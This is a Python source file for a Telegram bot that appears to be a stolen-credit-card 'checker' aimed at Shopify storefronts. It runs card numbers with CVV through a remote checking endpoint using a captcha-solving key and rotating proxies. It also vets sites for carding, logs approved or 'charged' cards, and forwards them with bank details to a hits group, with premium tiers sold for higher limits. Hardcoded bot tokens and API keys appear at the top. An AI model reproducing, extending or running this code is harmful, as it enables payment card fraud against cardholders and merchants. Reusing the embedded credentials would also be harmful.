from telethon import TelegramClient, events, Button
from telethon.tl.types import KeyboardButtonCallback
from telethon.sessions import MemorySession
import requests, random, datetime, json, os, re, asyncio, time, sys
import string
import hashlib
from urllib.parse import urlparse
import concurrent.futures
from functools import partial
import sqlite3
import platform

# --- Config ---
API_ID = 35384207
API_HASH = "09c4bc9de62a417ccdd0c69b33912515"
BOT_TOKEN = "8584105442:AAGX4zXgU70Nwy6c7o9HOV3D2cbtaeRqEnQ"
ADMIN_ID = [8199994609,8515333615]
OWNER_ID = 8199994609  # For session control
GROUP_ID = -1003694167299
CHANNEL_ID = -1003694167299
FORWARD_ID = -1003332800094
HITS_GROUP_ID = -1003413954160  # Group for hit notifications

# API Configuration - UPDATED
API_ENDPOINT = "https://wizxautosh-trqq.onrender.com/wizard.php"
CAPTCHA_API_KEY = "sub_1Su47XCRwBwvt6ptRmIm1QOa"

# Files
PREMIUM_FILE = "premium.json"
FREE_FILE = "free_users.json"
SITE_FILE = "user_sites.json"
KEYS_FILE = "keys.json"
CC_FILE = "cc.txt"
BANNED_FILE = "banned_users.json"
PROXY_FILE = "user_proxies.json"
AUTHORIZED_GROUPS_FILE = "authorized_groups.json"
RESULTS_FILE = "EVILXCHK.txt"

ACTIVE_MTXT_PROCESSES = {}
ACTIVE_SESSIONS = {}

# FIXED: Use MemorySession to avoid I/O errors on Pydroid3
client = TelegramClient(MemorySession(), API_ID, API_HASH)

# Create thread pool executor
thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=5)

# Global variables for stats
BOT_START_TIME = time.time()
TOTAL_CHECKS = 0
TOTAL_HITS = 0

# --- Fast Captcha Solver ---
class FastCaptchaSolver:
    def __init__(self):
        self.api_key = CAPTCHA_API_KEY
        
    def solve_all_captchas(self, site_url, proxy=None):
        try:
            captcha_url = f"{API_ENDPOINT}?capkey={self.api_key}&site={site_url}"
            
            if proxy:
                proxy_url = format_proxy_for_requests_sync(proxy)
                if proxy_url:
                    captcha_url += f"&proxy={proxy}"
            
            def request_sync():
                try:
                    response = requests.get(captcha_url, timeout=30)
                    if response.status_code == 200:
                        response_text = response.text
                        if "solved" in response_text.lower() or "token" in response_text.lower():
                            token_match = re.search(r'token["\']?\s*:\s*["\']([^"\']+)["\']', response_text)
                            if token_match:
                                return True, token_match.group(1)
                        
                        json_data = extract_json_from_response(response_text)
                        if json_data:
                            if json_data.get("status") == "solved":
                                return True, json_data.get("token", "captcha_solved")
                    
                    return False, "Captcha not solved"
                except Exception as e:
                    return False, str(e)
            
            return run_in_thread(request_sync)
            
        except Exception as e:
            return False, str(e)

# Initialize captcha solver
captcha_solver = FastCaptchaSolver()

# --- Sync wrappers ---
def run_in_thread(func, *args):
    loop = asyncio.get_event_loop()
    return loop.run_in_executor(thread_pool, partial(func, *args))

def create_json_file_sync(filename):
    try:
        if not os.path.exists(filename):
            with open(filename, "w") as file:
                file.write(json.dumps({}))
    except Exception as e:
        print(f"Error creating {filename}: {str(e)}")

def load_json_sync(filename):
    try:
        if not os.path.exists(filename):
            create_json_file_sync(filename)
        with open(filename, "r") as f:
            content = f.read()
            return json.loads(content)
    except Exception as e:
        print(f"Error loading {filename}: {str(e)}")
        return {}

def save_json_sync(filename, data):
    try:
        with open(filename, "w") as f:
            f.write(json.dumps(data, indent=4))
    except Exception as e:
        print(f"Error saving {filename}: {str(e)}")

async def load_json(filename):
    return await run_in_thread(load_json_sync, filename)

async def save_json(filename, data):
    return await run_in_thread(save_json_sync, filename, data)

# --- Authorized Groups Functions ---
def load_authorized_groups_sync():
    return load_json_sync(AUTHORIZED_GROUPS_FILE)

def save_authorized_groups_sync(groups_data):
    save_json_sync(AUTHORIZED_GROUPS_FILE, groups_data)

async def is_group_authorized(group_id):
    groups_data = await run_in_thread(load_authorized_groups_sync)
    return str(group_id) in groups_data

async def add_authorized_group(group_id, added_by):
    groups_data = await run_in_thread(load_authorized_groups_sync)
    
    if str(group_id) in groups_data:
        return False, "Group already authorized"
    
    groups_data[str(group_id)] = {
        'added_by': added_by,
        'added_at': datetime.datetime.now().isoformat(),
        'limit': 200
    }
    
    await run_in_thread(save_authorized_groups_sync, groups_data)
    return True, f"Group {group_id} authorized successfully with 200 card limit"

async def remove_authorized_group(group_id):
    groups_data = await run_in_thread(load_authorized_groups_sync)
    
    if str(group_id) not in groups_data:
        return False, "Group not found in authorized list"
    
    del groups_data[str(group_id)]
    await run_in_thread(save_authorized_groups_sync, groups_data)
    return True, f"Group {group_id} removed from authorized list"

async def get_all_authorized_groups():
    groups_data = await run_in_thread(load_authorized_groups_sync)
    return groups_data

# --- OPTIMIZED Site Checker ---
async def test_single_site_optimized(site, test_card="4031630422575208|01|2030|280", proxy=None):
    global TOTAL_CHECKS
    TOTAL_CHECKS += 1
    
    try:
        url = f"{API_ENDPOINT}?site={site}&cc={test_card}"
        
        if proxy:
            url += f"&proxy={proxy}"
        
        url += f"&capkey={CAPTCHA_API_KEY}"
        
        def request_sync():
            try:
                response = requests.get(url, timeout=30)
                response_text = response.text
                
                if response.status_code != 200:
                    return {"status": "dead", "response": f"HTTP {response.status_code}", "site": site, "price": "-"}
                
                json_data = extract_json_from_response(response_text)
                
                if not json_data:
                    if any(word in response_text.lower() for word in ["thank you", "success", "approved"]):
                        return {"status": "working", "response": "Captcha Solved - Working", "site": site, "price": "Unknown"}
                    return {"status": "dead", "response": "No JSON response", "site": site, "price": "-"}
                
                response_msg = json_data.get("Response", json_data.get("response", ""))
                price = json_data.get("Price", json_data.get("price", "-"))
                
                if not response_msg:
                    return {"status": "dead", "response": "Empty response", "site": site, "price": price}
                
                response_lower = response_msg.lower()
                
                working_indicators = [
                    "thank you", "incorrect_zip", "card decline", "3dcc", "ccn", 
                    "incorrect card number", "card cvv", "card ccn", "captcha",
                    "insufficient funds", "approved", "success", "incorrect_cvv", 
                    "invalid_cvv", "incorrect_cvc", "invalid_cvc", "payment successful", 
                    "hcaptcha", "solved", "token", "captcha_solved"
                ]
                
                for indicator in working_indicators:
                    if indicator in response_lower:
                        return {"status": "working", "response": response_msg, "site": site, "price": price}
                
                dead_indicators = [
                    "del ammount empty", "del amount empty", "product id is empty",
                    "tax amount is empty", "token not found", "gateway not configured",
                    "shopify domain not found", "invalid shopify url", "site not found",
                    "r4 token empty", "clinte token", "product id empty", 
                    "invalid url", "py id empty"
                ]
                
                for indicator in dead_indicators:
                    if indicator in response_lower:
                        return {"status": "dead", "response": response_msg, "site": site, "price": price}
                
                return {"status": "dead", "response": response_msg, "site": site, "price": price}
                    
            except requests.exceptions.Timeout:
                return {"status": "dead", "response": "Timeout (30s)", "site": site, "price": "-"}
            except requests.exceptions.ConnectionError:
                return {"status": "dead", "response": "Connection Error", "site": site, "price": "-"}
            except Exception as e:
                return {"status": "dead", "response": str(e)[:50], "site": site, "price": "-"}
        
        result = await run_in_thread(request_sync)
        return result
                
    except Exception as e:
        return {"status": "dead", "response": str(e)[:50], "site": site, "price": "-"}

async def test_multiple_sites_optimized(sites, test_card="4031630422575208|01|2030|280", proxy=None, max_concurrent=3):
    semaphore = asyncio.Semaphore(max_concurrent)
    
    async def test_with_semaphore(site):
        async with semaphore:
            await asyncio.sleep(0.5)
            return await test_single_site_optimized(site, test_card, proxy)
    
    tasks = [test_with_semaphore(site) for site in sites]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    processed_results = []
    for site, result in zip(sites, results):
        if isinstance(result, Exception):
            processed_results.append({"status": "dead", "response": str(result)[:50], "site": site, "price": "-"})
        else:
            processed_results.append(result)
    
    return processed_results

# --- Utility Functions ---
async def initialize_files():
    files = [PREMIUM_FILE, FREE_FILE, SITE_FILE, KEYS_FILE, BANNED_FILE, PROXY_FILE, AUTHORIZED_GROUPS_FILE, RESULTS_FILE]
    for file in files:
        create_json_file_sync(file)

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

def generate_session_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

async def is_member_of_required_chats(user_id):
    try:
        if user_id in ADMIN_ID:
            return True
        
        try:
            await client.get_permissions(GROUP_ID, user_id)
            await client.get_permissions(CHANNEL_ID, user_id)
            return True
        except:
            return False
            
    except Exception as e:
        print(f"Error in membership check: {e}")
        return False

async def check_membership_and_reply(event):
    user_id = event.sender_id
    
    if user_id in ADMIN_ID:
        return True
    
    if event.is_group:
        is_authorized = await is_group_authorized(event.chat_id)
        if is_authorized:
            return True
    
    is_member = await is_member_of_required_chats(user_id)
    
    if not is_member:
        buttons = [
            [Button.url("🚀 Join Group", "https://t.me/+hHylRLru9js1ODk1")],
            [Button.url("📢 Join Channel", "https://t.me/+lUch4HwcoeE0Nzg1")]
        ]
        await event.reply("""🚫 **Access Denied!**

To use this bot, you must join both:
1. Our Group
2. Our Channel

Join both and try again!""", buttons=buttons)
        return False
    
    return True

def is_premium_user_sync(user_id):
    premium_users = load_json_sync(PREMIUM_FILE)
    user_data = premium_users.get(str(user_id))
    if not user_data: 
        return False
    expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
    current_date = datetime.datetime.now()
    if current_date > expiry_date:
        del premium_users[str(user_id)]
        save_json_sync(PREMIUM_FILE, premium_users)
        return False
    return True

async def is_premium_user(user_id):
    return await run_in_thread(is_premium_user_sync, user_id)

async def add_premium_user(user_id, days):
    await run_in_thread(add_premium_user_sync, user_id, days)

def add_premium_user_sync(user_id, days):
    premium_users = load_json_sync(PREMIUM_FILE)
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    premium_users[str(user_id)] = {
        'expiry': expiry_date.isoformat(),
        'added_by': 'admin',
        'days': days,
        'added_at': datetime.datetime.now().isoformat()
    }
    save_json_sync(PREMIUM_FILE, premium_users)

async def remove_premium_user(user_id):
    return await run_in_thread(remove_premium_user_sync, user_id)

def remove_premium_user_sync(user_id):
    premium_users = load_json_sync(PREMIUM_FILE)
    if str(user_id) in premium_users:
        del premium_users[str(user_id)]
        save_json_sync(PREMIUM_FILE, premium_users)
        return True
    return False

async def is_banned_user(user_id):
    return await run_in_thread(is_banned_user_sync, user_id)

def is_banned_user_sync(user_id):
    banned_users = load_json_sync(BANNED_FILE)
    return str(user_id) in banned_users

async def ban_user(user_id, banned_by):
    await run_in_thread(ban_user_sync, user_id, banned_by)

def ban_user_sync(user_id, banned_by):
    banned_users = load_json_sync(BANNED_FILE)
    banned_users[str(user_id)] = {
        'banned_at': datetime.datetime.now().isoformat(),
        'banned_by': banned_by
    }
    save_json_sync(BANNED_FILE, banned_users)

async def unban_user(user_id):
    return await run_in_thread(unban_user_sync, user_id)

def unban_user_sync(user_id):
    banned_users = load_json_sync(BANNED_FILE)
    if str(user_id) in banned_users:
        del banned_users[str(user_id)]
        save_json_sync(BANNED_FILE, banned_users)
        return True
    return False

def get_bin_info_sync(card_number):
    try:
        bin_number = card_number[:6]
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=30)
        if response.status_code != 200: 
            return "BIN Info Not Found", "-", "-", "-", "-", "🏳️"
        try:
            data = response.json()
            brand = data.get('brand', '-')
            bin_type = data.get('type', '-')
            level = data.get('level', '-')
            bank = data.get('bank', '-')
            country = data.get('country_name', '-')
            flag = data.get('country_flag', '🏳️')
            return brand, bin_type, level, bank, country, flag
        except json.JSONDecodeError: 
            return "-", "-", "-", "-", "-", "🏳️"
    except Exception: 
        return "-", "-", "-", "-", "-", "🏳️"

async def get_bin_info(card_number):
    return await run_in_thread(get_bin_info_sync, card_number)

def normalize_card(text):
    if not text: return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16: cc = part
        elif len(part) == 4 and part.startswith('20'): yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '': mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '': yy = part
        elif len(part) in [3, 4] and cvv == '': cvv = part
    if cc and mm and yy and cvv: return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_json_from_response(response_text):
    if not response_text: return None
    start_index = response_text.find('{')
    if start_index == -1: return None
    brace_count = 0
    end_index = -1
    for i in range(start_index, len(response_text)):
        if response_text[i] == '{': brace_count += 1
        elif response_text[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                end_index = i
                break
    if end_index == -1: return None
    json_text = response_text[start_index:end_index + 1]
    try: return json.loads(json_text)
    except json.JSONDecodeError: return None

def check_card_random_site_sync(card, sites, proxy=None):
    if not sites: 
        return {"Response": "ERROR", "Price": "-", "Gateway": "-"}, -1
    
    if not proxy:
        return {"Response": "PROXY_REQUIRED", "Price": "-", "Gateway": "-"}, -1
    
    selected_site = random.choice(sites)
    site_index = sites.index(selected_site) + 1
    
    try:
        url = f"{API_ENDPOINT}?site={selected_site}&cc={card}&capkey={CAPTCHA_API_KEY}"
        
        if proxy:
            url += f"&proxy={proxy}"
        
        response = requests.get(url, timeout=30)
        if response.status_code != 200: 
            return {"Response": f"HTTP_ERROR_{response.status_code}", "Price": "-", "Gateway": "-"}, site_index
        
        response_text = response.text
        json_data = extract_json_from_response(response_text)
        
        if json_data: 
            return json_data, site_index
        else:
            if any(word in response_text.lower() for word in ["thank you", "success", "approved"]):
                return {"Response": "Thank You - Captcha Solved", "Price": "Unknown", "Gateway": "Shopify"}, site_index
            return {"Response": "INVALID_JSON", "Price": "-", "Gateway": "-"}, site_index
        
    except Exception as e: 
        return {"Response": str(e), "Price": "-", "Gateway": "-"}, site_index

async def check_card_random_site(card, sites, proxy=None):
    return await run_in_thread(check_card_random_site_sync, card, sites, proxy)

def check_card_specific_site_sync(card, site, proxy=None):
    global TOTAL_CHECKS
    TOTAL_CHECKS += 1
    
    try:
        if not proxy:
            return {"Response": "PROXY_REQUIRED", "Price": "-", "Gateway": "-"}
        
        url = f"{API_ENDPOINT}?site={site}&cc={card}&capkey={CAPTCHA_API_KEY}"
        
        if proxy:
            url += f"&proxy={proxy}"
        
        response = requests.get(url, timeout=30)
        if response.status_code != 200: 
            return {"Response": f"HTTP_ERROR_{response.status_code}", "Price": "-", "Gateway": "-"}
        
        response_text = response.text
        json_data = extract_json_from_response(response_text)
        
        if json_data: 
            return json_data
        else:
            if any(word in response_text.lower() for word in ["thank you", "success", "approved"]):
                return {"Response": "Thank You - Captcha Solved", "Price": "Unknown", "Gateway": "Shopify"}
            return {"Response": "INVALID_JSON", "Price": "-", "Gateway": "-"}
            
    except Exception as e: 
        return {"Response": str(e), "Price": "-", "Gateway": "-"}

async def check_card_specific_site(card, site, proxy=None):
    return await run_in_thread(check_card_specific_site_sync, card, site, proxy)

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4: yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return normalize_card(text)

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card: cards.add(card)
    return list(cards)

async def can_use(user_id, chat):
    if await is_banned_user(user_id):
        return False, "banned"

    is_premium = await is_premium_user(user_id)
    is_private = chat.id == user_id

    if is_private:
        if is_premium:
            return True, "premium_private"
        else:
            return False, "no_access"
    else:
        if not is_private:
            is_authorized = await is_group_authorized(chat.id)
            if is_authorized:
                return True, "authorized_group"
        
        if is_premium:
            return True, "premium_group"
        else:
            return True, "group_free"

def get_cc_limit(access_type, user_id=None, chat_id=None):
    if user_id and user_id in ADMIN_ID:
        return 99999
    
    if chat_id:
        try:
            groups_data = load_json_sync(AUTHORIZED_GROUPS_FILE)
            if str(chat_id) in groups_data:
                return 200
        except:
            pass
    
    if access_type in ["premium_private", "premium_group"]:
        return 3500
    elif access_type == "group_free" or access_type == "authorized_group":
        return 200
    return 0

async def save_approved_card(card, status, response, gateway, price):
    global TOTAL_HITS
    if "charged" in status.lower() or "approved" in status.lower():
        TOTAL_HITS += 1
    
    def save_sync():
        try:
            with open(CC_FILE, "a", encoding="utf-8") as f:
                f.write(f"{card} | {status} | {response} | {gateway} | {price}\n")
        except Exception as e: 
            print(f"Error saving card to {CC_FILE}: {str(e)}")
    
    await run_in_thread(save_sync)

async def pin_charged_message(event, message):
    try:
        if event.is_group: 
            await message.pin()
    except Exception as e: 
        print(f"Failed to pin message: {e}")

async def forward_to_hits_group(card, response, gateway, price, site_index, user_id):
    try:
        if not HITS_GROUP_ID:
            return
            
        if not response:
            return
            
        response_lower = response.lower()
        
        working_indicators = [
            "thank you", "incorrect_zip", "card decline", 
            "3dcc", "ccn", "incorrect card number", "card cvv",
            "card ccn", "insufficient funds", "approved", "success",
            "incorrect_cvv", "invalid_cvv", "incorrect_cvc", "invalid_cvc",
            "payment successful", "captcha_solved"
        ]
        
        for indicator in working_indicators:
            if indicator in response_lower:
                print(f"🎯 HIT DETECTED! Forwarding to Hits Group...")
                
                try:
                    user = await client.get_entity(user_id)
                    user_name = user.first_name or "Unknown"
                    username = f"@{user.username}" if user.username else "No Username"
                except Exception as e:
                    user_name = "Unknown"
                    username = "No Username"
                
                bin_info = await get_bin_info(card.split("|")[0])
                brand, bin_type, level, bank, country, flag = bin_info
                
                forward_msg = f"""🎯 **HITS FORWARD** 🎯

👤 **User:** {user_name} ({username})
🆔 **User ID:** `{user_id}`
💳 **Card:** `{card}`
🌐 **Gateway:** {gateway}
💰 **Price:** {price}
🔗 **Site:** {site_index}
📝 **Response:** {response}

```BIN Info: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}```

⏰ **Time:** {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"""

                try:
                    await client.send_message(HITS_GROUP_ID, forward_msg)
                except Exception as e:
                    print(f"❌ Error sending message to hits group: {e}")
                break
            
    except Exception as e:
        print(f"❌ Error in forward_to_hits_group: {e}")

# --- NEW: Send hit notification to group ---
async def send_hit_notification(card, gateway, price, response, user_id, user_name):
    try:
        # Get user info
        try:
            user = await client.get_entity(user_id)
            username = f"@{user.username}" if user.username else "No Username"
        except:
            username = "No Username"
        
        # Get bin info
        bin_info = await get_bin_info(card.split("|")[0])
        brand, bin_type, level, bank, country, flag = bin_info
        
        hit_msg = f"""⩙ 𝗛𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 ↬ 𝐂𝐇𝐀𝐑𝐆𝐄𝐃 🔥

⊀ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ↬ {gateway}
⊀ 𝗣𝗿𝗶𝗰𝗲 ↬ {price}
⊀ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ↬ {response}
⊀ 𝗖𝗮𝗿𝗱 ↬ `{card}`
⊀ 𝗕𝗜𝗡 ↬ {brand} - {bin_type} - {level}
⊀ 𝗕𝗮𝗻𝗸 ↬ {bank}
⊀ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↬ {country} {flag}

⌬ 𝗨𝘀𝗲𝗿 ↬ {user_name} ({username})
⌬ 𝐇𝐢𝐭 𝐅𝐫𝐨𝐦 ↬ [𝐀𝐓𝐔𝐋 𝐗 𝐒𝐇𝐎𝐏𝐈𝐅𝐘](https://t.me/+lUch4HwcoeE0Nzg1)"""
        
        await client.send_message(HITS_GROUP_ID, hit_msg)
        
    except Exception as e:
        print(f"❌ Error sending hit notification: {e}")

# --- NEW: Send charged card to user via DM ---
async def send_charged_card_to_user(user_id, card, gateway, price, response):
    try:
        bin_info = await get_bin_info(card.split("|")[0])
        brand, bin_type, level, bank, country, flag = bin_info
        
        charged_msg = f"""🎯 **CHARGED CARD FOUND!** 🎯

💳 **Card:** `{card}`
🌐 **Gateway:** {gateway}
💰 **Price:** {price}
📝 **Response:** {response}

```BIN Info: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}```

⏰ **Time:** {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
👤 **User ID:** `{user_id}`"""
        
        await client.send_message(user_id, charged_msg)
        
    except Exception as e:
        print(f"❌ Error sending charged card to user: {e}")

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try: 
            parsed = urlparse(url)
        except: 
            return False
        domain = parsed.netloc
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(domain_pattern, domain))

def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line and is_valid_url_or_domain(cleaned_line): 
            clean_urls.add(cleaned_line)
    return list(clean_urls)

def is_site_dead(response_text):
    if not response_text: 
        return True
    
    response_lower = response_text.lower()
    
    dead_indicators = [
        "del ammount empty", "del amount empty", "product id is empty",
        "tax amount is empty", "token not found", "gateway not configured",
        "shopify domain not found", "invalid shopify url", "site not found",
        "r4 token empty", "clinte token", "product id empty", 
        "invalid url", "py id empty" "captcha" "captcha-notsolved" "captcha_required"
    ]
    
    for indicator in dead_indicators:
        if indicator in response_lower:
            return True
    
    working_indicators = [
        "incorrect_zip", "card decline", "3dcc", "ccn", 
        "incorrect card number", "card cvv", "card ccn",
        "thank you", "payment successful", "approved", "success",
        "incorrect_cvv", "invalid_cvv", "incorrect_cvc", "invalid_cvc",
        "insufficient funds", "captcha_solved", "solved"
    ]
    
    for indicator in working_indicators:
        if indicator in response_lower:
            return False
    
    return False

# --- Proxy Functions ---
def format_proxy_for_requests_sync(proxy_str):
    try:
        proxy_str = proxy_str.strip()
        
        if '@' in proxy_str:
            if proxy_str.count('@') == 1:
                auth_part, server_part = proxy_str.split('@')
                if ':' in auth_part:
                    user, password = auth_part.split(':', 1)
                    return f"http://{user}:{password}@{server_part}"
                else:
                    return f"http://{proxy_str}"
            elif proxy_str.count(':') >= 3 and proxy_str.count('@') == 1:
                parts = proxy_str.split(':')
                if len(parts) >= 4:
                    host = parts[0]
                    port = parts[1]
                    user = parts[2]
                    password = parts[3]
                    return f"http://{user}:{password}@{host}:{port}"
        else:
            parts = proxy_str.split(':')
            if len(parts) == 2:
                host, port = parts
                return f"http://{host}:{port}"
            elif len(parts) >= 4:
                host, port, user, password = parts[0], parts[1], parts[2], parts[3]
                return f"http://{user}:{password}@{host}:{port}"
        
        return None
    except Exception as e:
        print(f"Error formatting proxy: {e}")
        return None

async def test_proxy_connection(proxy_str):
    try:
        test_url = "http://httpbin.org/ip"
        
        proxy_url = format_proxy_for_requests_sync(proxy_str)
        if not proxy_url:
            return False, "Invalid proxy format"
        
        def test_sync():
            try:
                proxies = {'http': proxy_url, 'https': proxy_url}
                response = requests.get(test_url, timeout=30, proxies=proxies)
                if response.status_code == 200:
                    data = response.json()
                    return True, f"Working - IP: {data.get('origin', 'Unknown')}"
                else:
                    return False, f"HTTP Error: {response.status_code}"
            except requests.exceptions.ConnectionError:
                return False, "Connection failed"
            except requests.exceptions.Timeout:
                return False, "Timeout (30s)"
            except Exception as e:
                return False, f"Error: {str(e)}"
        
        return await run_in_thread(test_sync)
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"

async def add_user_proxy(user_id, proxy_str):
    try:
        is_working, message = await test_proxy_connection(proxy_str)
        
        if not is_working:
            return False, f"Proxy not working: {message}"
        
        proxies_data = load_json_sync(PROXY_FILE)
        
        if str(user_id) not in proxies_data:
            proxies_data[str(user_id)] = []
        
        user_proxies = proxies_data[str(user_id)]
        if proxy_str in user_proxies:
            return False, "Proxy already exists"
        
        user_proxies.append(proxy_str)
        proxies_data[str(user_id)] = user_proxies
        save_json_sync(PROXY_FILE, proxies_data)
        
        return True, f"Proxy added successfully: {message}"
    except Exception as e:
        return False, f"Error: {str(e)}"

async def get_user_proxies(user_id):
    proxies_data = load_json_sync(PROXY_FILE)
    return proxies_data.get(str(user_id), [])

async def remove_user_proxies(user_id):
    try:
        proxies_data = load_json_sync(PROXY_FILE)
        if str(user_id) in proxies_data:
            del proxies_data[str(user_id)]
            save_json_sync(PROXY_FILE, proxies_data)
            return True, "All proxies removed"
        return False, "No proxies found"
    except Exception as e:
        return False, f"Error: {str(e)}"

async def get_random_user_proxy(user_id):
    proxies = await get_user_proxies(user_id)
    if proxies:
        return random.choice(proxies)
    return None

def banned_user_message():
    return "🚫 **You Are Banned!**\n\nYou are not allowed to use this bot.\n\nFor appeal, contact @DARK_FROXT_73"

# --- FIXED /add COMMAND ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\s+(.+)$'))
async def add_site_command(event):
    if not await check_membership_and_reply(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        return await event.reply("🚫 Unauthorized Access!")
    
    sites_text = event.pattern_match.group(1)
    urls_to_add = extract_urls_from_text(sites_text)
    
    if not urls_to_add:
        return await event.reply("❌ No valid URLs found!\n\nFormat: `/add example.com` or `/add https://example.com`")
    
    status_msg = await event.reply(f"🔄 **Checking {len(urls_to_add)} site(s) before adding...**")
    
    proxy = await get_random_user_proxy(event.sender_id)
    
    results = await test_multiple_sites_optimized(urls_to_add, proxy=proxy, max_concurrent=3)
    
    sites_data = load_json_sync(SITE_FILE)
    user_id_str = str(event.sender_id)
    
    if user_id_str not in sites_data:
        sites_data[user_id_str] = []
    
    user_sites = sites_data[user_id_str]
    working_added = []
    dead_not_added = []
    
    for site, result in zip(urls_to_add, results):
        if site in user_sites:
            continue
        
        if result["status"] == "working":
            user_sites.append(site)
            working_added.append(f"{site} - {result['response'][:30]}")
        else:
            dead_not_added.append(f"{site} - {result['response'][:30]}")
    
    sites_data[user_id_str] = user_sites
    save_json_sync(SITE_FILE, sites_data)
    
    response = f"📊 **Site Addition Results**\n\n"
    
    if working_added:
        response += f"✅ **Added (Working):** {len(working_added)} site(s)\n"
        for idx, site in enumerate(working_added[:5], 1):
            response += f"{idx}. `{site}`\n"
        if len(working_added) > 5:
            response += f"...and {len(working_added) - 5} more\n"
    
    if dead_not_added:
        response += f"\n❌ **Not Added (Dead):** {len(dead_not_added)} site(s)\n"
        for idx, site in enumerate(dead_not_added[:3], 1):
            response += f"{idx}. {site}\n"
        if len(dead_not_added) > 3:
            response += f"...and {len(dead_not_added) - 3} more\n"
    
    response += f"\n📊 **Total Sites Now:** {len(user_sites)}"
    
    await status_msg.edit(response)

# --- FIXED /setsite COMMAND (UNLIMITED SITES - 100 LIMIT REMOVED) ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.]setsite$'))
async def setsite_command(event):
    if not await check_membership_and_reply(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        return await event.reply("🚫 Unauthorized Access!")
    
    if not event.reply_to_msg_id:
        return await event.reply("📁 **Reply to a TXT file!**\n\nPlease reply to a .txt file containing sites with `/setsite`")
    
    replied_msg = await event.get_reply_message()
    if not replied_msg.document:
        return await event.reply("❌ **Please reply to a document file!**")
    
    file_name = replied_msg.document.attributes[0].file_name.lower() if replied_msg.document.attributes else ""
    
    if not file_name.endswith('.txt'):
        return await event.reply("❌ **Only TXT files are supported!**")
    
    status_msg = await event.reply("📥 **Downloading file...**")
    file_path = await replied_msg.download_media()
    
    def read_sites_from_file(path):
        sites = set()
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                sites = set(extract_urls_from_text(content))
            
            os.remove(path)
            return list(sites)
        except Exception as e:
            print(f"Error reading file: {e}")
            return []
    
    sites = await run_in_thread(read_sites_from_file, file_path)
    
    if not sites:
        await status_msg.edit("❌ **No valid sites found in the file!**")
        return
    
    # NO LIMIT APPLIED - ALL SITES WILL BE PROCESSED
    await status_msg.edit(f"🔄 **Found {len(sites)} sites**\n\nChecking before adding...")
    
    proxy = await get_random_user_proxy(event.sender_id)
    
    # Process sites in batches to avoid timeouts
    batch_size = 50
    all_results = []
    
    for i in range(0, len(sites), batch_size):
        batch = sites[i:i + batch_size]
        batch_results = await test_multiple_sites_optimized(batch, proxy=proxy, max_concurrent=3)
        all_results.extend(batch_results)
        
        if i + batch_size < len(sites):
            await status_msg.edit(f"🔄 **Processing sites... ({min(i + batch_size, len(sites))}/{len(sites)})**")
    
    sites_data = load_json_sync(SITE_FILE)
    user_id_str = str(event.sender_id)
    
    if user_id_str not in sites_data:
        sites_data[user_id_str] = []
    
    user_sites = sites_data[user_id_str]
    working_added = []
    dead_not_added = []
    
    for site, result in zip(sites, all_results):
        if site in user_sites:
            continue
        
        if result["status"] == "working":
            user_sites.append(site)
            working_added.append(f"{site} - {result['response'][:30]}")
        else:
            dead_not_added.append(f"{site} - {result['response'][:30]}")
    
    sites_data[user_id_str] = user_sites
    save_json_sync(SITE_FILE, sites_data)
    
    response = f"📊 **Bulk Site Addition Results**\n\n"
    
    if working_added:
        response += f"✅ **Added (Working):** {len(working_added)} site(s)\n"
        for idx, site in enumerate(working_added[:10], 1):
            response += f"{idx}. `{site}`\n"
        if len(working_added) > 10:
            response += f"...and {len(working_added) - 10} more\n"
    
    if dead_not_added:
        response += f"\n❌ **Not Added (Dead):** {len(dead_not_added)} site(s)\n"
        for idx, site in enumerate(dead_not_added[:5], 1):
            response += f"{idx}. {site}\n"
        if len(dead_not_added) > 5:
            response += f"...and {len(dead_not_added) - 5} more\n"
    
    response += f"\n📊 **Total Sites Now:** {len(user_sites)}"
    
    await status_msg.edit(response)

# --- FIXED /key COMMAND (Updated) ---
